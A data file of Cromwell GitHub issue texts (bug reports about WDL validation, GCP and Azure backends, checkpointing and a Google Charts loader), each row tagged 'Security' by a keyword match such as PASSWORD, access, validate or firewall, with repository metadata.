Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->; I am trying to run Cromwell with Google backend using PAPIv2.conf. Is there a way NOT doing the project network label for network Virtual Private Network? So that I can give the full network and subnetwork address as parameter into the PAPIv2.conf file? . I saw the questions around supporting the shared VPC network in previous issues . May be using the path like ; --network=projects/host-gcp-project/global/networks/name-of-the-network ; --subnetwork=projects/host-gcp-project/regions/us-central1/subnetworks/name-of-the-subnetwork. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->; Backend: Google; <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6453:1435,PASSWORD,PASSWORDS,1435,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6453,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. **_Are you seeing something that looks like a bug? Please attach as much information as possible._**; No. The job is killed because of memory limitations _e.g_ `/bin/bash: line 1: 172 Killed`. **_Which backend are you running?_**; I'm running `Cromwell` on a local machine, I should have enough memory to run the process but somehow to amount visible/accessible by `Cromwell` is limited. **_Paste/Attach your workflow if possible:_**; ```; version 1.0. workflow step2 {; input {; String PANGENIE_CONTAINER = ""overcraft90/eblerjana_pangenie:2.1.2""; ; File FORWARD_FASTQ # compressed R1; File REVERSE_FASTQ # compressed R2; String NAME = ""sample"" # how to loop over samples' name in numerical order (maybe grub names' prefix)!?. File PANGENOME_VCF # input vcf with variants to be genotyped; File REF_GENOME # reference for variant calling; String VCF_PREFIX = ""genotype"" # string to attach to a sample's genotype; String EXE_PATH = ""/app/pangenie/build/src/PanGenie"" # path to PanGenie executable in Docker. Int CORES = 24 # number of cores to allocate for PanGenie execution; Int DISK = 300 # storage memory for output files; Int MEM = 100 # RAM memory allocated; }. call reads_extraction_and_merging {; input:; in_container_pangenie=PANGENIE_CONTAINER,; in_forward_fastq=FORWARD_FASTQ,; in_reverse_fastq=REVERSE_FASTQ,; in_label=NAME, #later can be plural; in_cores=CORES,; in_disk=DISK,; in_mem=MEM; }. call genome_inference {; input:; in_container_pangenie=PANGENIE_CONTAINER, # not sure whether Docker needs to be re-run; in_pangenome_vcf=PANGENOME_VCF,; in_reference_genome=REF_GENOME,; in_executable=EXE_PATH,; in_fastq_file=reads",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6966:717,access,accessible,717,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6966,1,['access'],['accessible']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. # Description. I believe this is a bug. I tried to use `stderr()` in the `output` section of a `workflow`, rather than the output section of a `task`. The resulting WDL validated fine using `womtool validate` (and it validated fine on Terra with the automatic validation they do). But the job would run about halfway and then automatically switch to ""Aborting"" status with no explanation or error message. The workflow would eventually fail after a huge delay (about 22 hours), and there would be no real error message. All tasks that ran were successful (but not all tasks ran). # Minimal WDL example. Here is a working example:. ```wdl; version 1.0. workflow my_workflow {; call my_task; }. task my_task {; command {; echo ""hello world""; }; output {; File out = stdout(); }; }; ```. And here is a non-working example that still validates fine using `womtool validate`:. ```wdl; version 1.0. workflow my_workflow {; input {; Boolean run_task; }. if (run_task) {; call my_task; }. output {; File out = select_first([my_task.out, stdout()]); }; }. task my_task {; command {; echo ""hello world""; }; output {; File out = stdout(); }; }; ```. The above gives; ```console; (cromwell) [sfleming@laptop:~/cromwell]$ womtool validate test.wdl ; Success!; ```. # The problem. The problem is that the non-working WDL example above should not validate successfully, as it is NOT a valid WDL. The `stdout()` built-in inside the `select_first()` in the `output` block of the `workflow` is not actually allowed. It will cause a very bizarre err",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6976:640,validat,validated,640,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6976,4,['validat'],"['validate', 'validated', 'validation']"
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7117:623,PASSWORD,PASSWORDS,623,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7117,2,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. When trying to configure metadata-archive in cromwell server by adding the configuration below:; ```; archive-metadata {; # A filesystem able to access the specified bucket:; filesystems {; gcs {; # A reference to the auth to use for storing and retrieving metadata:; auth = ""user-service-account""; }; }. # Which bucket to use for storing the archived metadata; bucket = ""{{ backend_bucket }}""; }; ```. when the user-service-account auth is declared up in the configuration :; ```; google {. application-name = ""cromwell"". auths = [; {; name = ""user-service-account""; scheme = ""user_service_account""; }; ]; }; ```; We got the following error in Cromwell server initialization :; cromwell_1 | [ERROR] [06/21/2023 11:55:25.094] [cromwell-system-akka.actor.default-dispatcher-30] [akka://cromwell-system/user] Failed to parse the archive-metadata config:; cromwell_1 | Failed to construct archiver path builders from factories (reason 1 of 1): Missing parameters in workflow options: user_service_account_json; cromwell_1 | akka.actor.ActorInitializationException: akka://cromwell-system/user/cromwell-service/ServiceRegistryActor/MetadataService: exception during creation; cromwell_1 | 	at akka.actor.ActorInitializationException$.apply(Actor.scala:202); cromwell_1 | 	at akka.actor.ActorCell.create(ActorCell.scala:698); crom",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7171:623,PASSWORD,PASSWORDS,623,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7171,2,"['PASSWORD', 'access']","['PASSWORDS', 'access']"
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. womtool graph bug:; Exception in thread ""main"" java.util.NoSuchElementException: key not found: ScatterVariableNode(WomIdentifier(LocalName(lane),FullyQualifiedName(lane)),PlainAnonymousExpressionNode(WomIdentifier(LocalName(lane),FullyQualifiedName(lane)),WdlWomExpression(WdlExpression(<string:255:22 identifier ""TWVyZ2VJbnB1dFJlYWRz"">),[Scatter fqn=MAPRSEQSingleSampleMasterWF.$scatter_0, item=lane, collection=MergeInputReads]),WomMaybeEmptyArrayType(WomMaybeEmptyArrayType(WomSingleFileType)),Map(MergeInputReads -> ConnectedInputPort(MergeInputReads,WomMaybeEmptyArrayType(WomMaybeEmptyArrayType(WomSingleFileType)),GraphNodeOutputPort(MAPRSEQSingleSampleMasterWF.MergeInputReads),wom.graph.GraphNode$GraphNodeSetter$$Lambda$512/0x0000000800491040@2a9fd482))),WomMaybeEmptyArrayType(WomSingleFileType)); 	at scala.collection.immutable.Map$EmptyMap$.apply(Map.scala:101); 	at scala.collection.immutable.Map$EmptyMap$.apply(Map.scala:99); 	at wom.views.GraphPrint$.relevantAsUpstream$1(GraphPrint.scala:177); 	at wom.views.GraphPrint$.upstreamPortToRelevantNodes$1(GraphPrint.scala:187); 	at wom.views.GraphPrint$.$anonfun$upstreamLinks$1(GraphPrint.scala:190); 	at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); 	at scala.collection.immutable.Set$Set1.foreach(Set.scala:97); 	at scala.co",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6744:623,PASSWORD,PASSWORDS,623,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6744,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; I `docker load` a image locally on my device, found that there is no digest of it. ; No internet connection, but with docker-loaded images, how can I run docker image locally?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6940:623,PASSWORD,PASSWORDS,623,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6940,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->; Backend: GCP Batch; <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. When running a workflow with `google_project` and/or `google_compute_service_account` workflow options defined, those two options don't take/have any effect on the workflow. The workflow executes in the project defined in the Batch backend config, using the service account defined in the Batch backend config. This breaks the ability to run workflows cross-project from a single cromwell instance with a single gcp backend (which was supported in PAPI). Workarounds like defining multiple backends (each for a separate project/compute sa) are not ideal. Looking through the Batch [backend code](https://github.com/broadinstitute/cromwell/blob/4cddc6163b0b1d73e02f3723a82634df852b754b/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/api/GcpBatchRequestFactoryImpl.scala#L168-L169), it seems the issue is the `parent` and `gcpSa` are populated from `batchAttributes` and `gcpBatchParameters` rather than `createParameters` where the workflow options would override the values defined in the backend config. The fix for this seems trivial, so I will submit a PR.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7459:643,PASSWORD,PASSWORDS,643,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7459,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; Cromwell doesn't resolve relative file imports when main wdl is referenced using URL in azure. However GCP does resolve these relative paths. . Ideally you can just point to the wdl on github or dockstore and it would resolve the url relative paths correctly. <!-- Which backend are you running? -->; Azure batch. <!-- Paste/Attach your workflow if possible: -->; https://github.com/broadinstitute/viral-pipelines/blob/master/pipes/WDL/workflows/fetch_sra_to_bam.wdl. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6936:1000,PASSWORD,PASSWORDS,1000,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6936,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; Hello, I'm trying to run a workflow locally and it gets stalled on BackgroundConfigAsyncJobExecutionActor [5b4a3086Regenie.RegenieStep1WholeGenomeModel:NA:1]: Status change from - to WaitingForReturnCode; <!-- Which backend are you running? -->; I'm using a local backend; <!-- Paste/Attach your workflow if possible: -->; I'm attaching the workflow which is written in WDL language; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; I'm attaching a screenshot of the configuration file and the input files which I provide to cromwell in json format; <img width=""988"" alt=""Screenshot 2023-08-02 at 3 27 39 PM"" src=""https://github.com/broadinstitute/cromwell/assets/56558154/e676859c-4f47-4f3a-ae20-68b2ead010e9"">. Also I'm proving the workflow called regenie.txt; [regenie.txt](https://github.com/broadinstitute/cromwell/files/12243956/regenie.txt); <img width=""714"" alt=""Screenshot 2023-08-02 at 3 29 07 PM"" src=""https://github.com/broadinstitute/cromwell/assets/56558154/567932ac-ce61-41dc-b1c1-8321c2ccab54"">; I'm providing the full log file as well. ; [regenie.log](https://github.com/broadinstitute/cromwell/files/12243995/regenie.log); If I run the commands locally without using a WDL workflow this runs in under 10 seconds in my local computer. . I appreciate any insight. . I'm using cromwell-85.jar and my java version is ; openjdk version ""17.0.6"" 2023-01-17; OpenJDK Runtime Environment Temurin-17.0.6+10 (build 17.0.6+10); OpenJDK 64-Bit Server VM Temur",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7191:916,PASSWORD,PASSWORDS,916,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7191,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; The GCP batch backend preemption handling seems to have issue. When preemption happens the job had very high possibility to be error. The typical error would be : time=“…” level=error msg=“error waiting for container:” . It will take the preempt events as the error from Cromwell logs. However, in the google batch console, it shows clearly ""preemption notice has received and will be processed"". . <!-- Which backend are you running? -->; GCP batch ; <!-- Paste/Attach your workflow if possible: -->; The workflow works perfectly in GCP life science backend; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7407:1092,PASSWORD,PASSWORDS,1092,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. Hi, . I wrote my first WDL (yay!) and troubleshot it locally using miniwdl. Now, I'm trying to get that WDL uploaded to Terra and the WOMtool validation step continues to pass me a fatal error that I can't seem to figure out. I've reduced the WDL to a single step that can reproduce this error and pasted below. I can't imagine I'm the first person to have this issue, but couldn't find evidence of it on the interwebs! In sum, I have a WDL that appears to be working fine (via miniwdl), but WOMtool (and Dockstore for that matter) finds a fatal error that prevents me from using it on Terra. Please help, thanks!!!. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; `ERROR: Unexpected symbol (line 6, col 5) when parsing 'setter'. Expected equal, got ""String"". String bam_to_reads_mem_size ^ $setter = :equal $e -> $1 `. <!-- Which backend are you running? -->; `womtool v61`; `miniwdl v1.5.2`. <!-- Paste/Attach your workflow if possible: -->; ```; version 1.0 . #WORKFLOW DEFINITION; workflow StripReadsFromBam {; String bam_to_reads_disk_size; String bam_to_reads_mem_size. #converts BAM to FASTQ (R1 + R2); call BamToReads {; 	input:; 	disk_size = bam_to_reads_disk_size,; 	mem_size = bam_to_reads_mem_size; }. #Outputs single reads file; output {; File outputReads = BamToReads.outputReads; }; }. #Task Definitions; task BamToReads {; File InputBam; String SampleName; String disk_size; String mem_size. #Calls samtools view to do the conversion; command {; #Set -e and -o says if any command I run fails in this script, make sure to return a failure; set -e; set -o pipefai",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6767:508,validat,validation,508,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767,1,['validat'],['validation']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. Hi,. Since last week, our cromwell server instance on GCP started to encounter the following error in all the jobs:. ```; 2024-07-31 19:08:59 cromwell-system-akka.dispatchers.backend-dispatcher-35 WARN - PAPI request worker had 1 failures making 1 requests: ; Unable to complete PAPI request due to system or connection error (Unknown Error.); 2024-07-31 19:09:33 cromwell-system-akka.dispatchers.backend-dispatcher-56 WARN - PAPI request worker had 1 failures making 1 requests: ; Unable to complete PAPI request due to system or connection error (Unknown Error.); 2024-07-31 19:10:06 cromwell-system-akka.dispatchers.backend-dispatcher-56 WARN - PAPI request worker had 1 failures making 1 requests: ; Unable to complete PAPI request due to system or connection error (Unknown Error.); ```. However, with `Unknown Error` message, I don't know where to go for help. Do you have any suggestion?. Here are the configurations:. * Cromwell v85; * Genomics API; * PAPIv2 with `actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""`. Many thanks!. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7482:1707,PASSWORD,PASSWORDS,1707,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7482,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. I'm using Cromwell v87 on GCP Genomics API. When submitting a job, the error I got is the following:. ```; Caused by: java.lang.IllegalStateException: You are currently running with version 2.2.0 of google-api-client. You need at least version 1.31.1 of google-api-client to run version 1.32.1 of the Genomics API library.; at com.google.common.base.Preconditions.checkState(Preconditions.java:534); at com.google.api.client.util.Preconditions.checkState(Preconditions.java:113); at com.google.api.services.genomics.v2alpha1.Genomics.<clinit>(Genomics.java:44); ... 12 common frames omitted; ```. It seems that I need to downgrade the version of `google-api-client`. However, I don't know how to do it on my machine. Could anyone help? Thanks!. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7481:1368,PASSWORD,PASSWORDS,1368,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7481,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->; I am using `checkpointFile` in the `runtime` section of a WDL `task`. . I accidentally included a space in the checkpoint file name, and I see in the logs that this (probably) breaks checkpointing. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; Log file shows; ```; CHECKPOINTING: Making local copy of /cromwell_root/noise_prompting_classical monocyte_H_shard0.csv; cp: can't create 'monocyte_H_shard0.csv-tmp/noise_prompting_classical': No such file or directory; cp: can't create 'monocyte_H_shard0.csv-tmp/monocyte_H_shard0.csv': No such file or directory; cp: can't create 'monocyte_H_shard0.csv-tmp/noise_prompting_classical': No such file or directory; CHECKPOINTING: Uploading new checkpoint content; ```. <!-- Which backend are you running? -->; Running on GCP via Terra. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. When I remove the space in the filename, I see this in the logs, which appears to be working fine:. ```; CHECKPOINTING: Making local copy of /cromwell_root/noise_prompting_classical_monocyte_H_shard0.csv; CHECKPOINTING: Uploading new checkpoint content; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7441:1315,PASSWORD,PASSWORDS,1315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7441,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->; I think the minimum to reproduce the bug is just. ```; Array[File] foo = []; Array[String]? bar = foo; ```. which fails with. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 'bar' (reason 1 of 1): Evaluating foo failed: assertion failed: base member type WomMaybeEmptyArrayType(WomStringType) and womtype WomMaybeEmptyArrayType(WomSingleFileType) are not compatible"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ],; ```. Interestingly enough, this passes if the array is non-empty, or if the target is not optional, or if the source is type `Array[String]`. I am running cromwell ""v85 (ish)"" according to the administrator. Backend is AWS batch.; <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7399:1307,PASSWORD,PASSWORDS,1307,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7399,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->; womtool cannot be used in cwl; <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->; java -jar womtool-84.jar validate hello_world.cwl; No getWomBundle method implemented in CWL v1; <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6973:568,validat,validate,568,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6973,2,"['PASSWORD', 'validat']","['PASSWORDS', 'validate']"
Security,"<script type=""text/javascript"" src=""https://www.gstatic.com/charts/loader.js""></script>; . I am proposing to update workflow timing web page as the google timeline chart codes have been revised. Here the current code uses 'http://www.google.com/jsapi' (https://github.com/broadinstitute/cromwell/blob/c8bf8fdc51e2df19d8e8a3d066acc64f588f1b1c/engine/src/main/resources/workflowTimings/workflowTimings.html#L4). It is not suggested by Google Chart documentation (https://developers.google.com/chart/interactive/docs/gallery/timeline), and this URL is blocked by our firewall. In order to use cromwell timing API for myself, I suggest to change relevant lines to:. <script type=""text/javascript"" src=""https://www.gstatic.com/charts/loader.js""></script>; <script src=""https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js""></script>; <script type=""text/javascript"">. var parentWorkflowNames = [];; var expandedParentWorkflows = [];; var chartView;; google.charts.load('current', {packages: ['timeline']});; google.charts.setOnLoadCallback(drawChart);. Can you update cromwell source codes to do that? Or please let me know if you need a pull request. Thanks.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3887:564,firewall,firewall,564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3887,1,['firewall'],['firewall']
Security,"=$?; if [ \""$RC_GSUTIL\"" = \""1\"" ]; then\n grep \""Bucket is requester pays bucket but no user project provided.\"" gsutil_output.txt && echo \""Retrying with user project\""; gsutil -u bioinfo-prod -h \""Content-Type: text/plain; charset=UTF-8\"" cp /cromwell_root/stdout gs://temporary-files/PET508-001/workspace/SingleSampleGenotyping/b67b285a-1f63-4514-b472-8618f1082470/call-ubam2bam/from_ubam.to_bam_workflow/4306b863-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-BaseRecalibrator/shard-9/; fi ; RC=$?; if [ \""$RC\"" = \""0\"" ]; then break; fi; sleep 5; done; return \""$RC\""; }; retry"": Copying file: ///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. ""; }],; message: ""Workflow failed""; }],; message: ""Workflow failed""; }; ],; ```. This step is executed in a scatter way, 17x per analysis (distinct genomic interval for each shard). Bellow follows the cromwell script of the shard that processed chromosome 12 and 13:. ```bash; #!/bin/bash. cd /cromwell_root; tmpDir=$(mkdir -p ""/cromwell_root/tmp.a7701249"" && echo ""/cromwell_root/tmp.a7701249""); chmod 777 ""$tmpDir""; export _JAVA_OPTIONS=-Djava.io.tmpdir=""$tmpDir""; export TMPDIR=""$tmpDir""; export HOME=""$HOME""; (; cd /cromwell_root. ); oute4a6eeab=""${tmpDir}/out.$$"" erre4a6eeab=""${tmpDir}/err.$$""; mkfifo ""$oute4a6eeab"" ""$erre4a6eeab""; trap 'rm 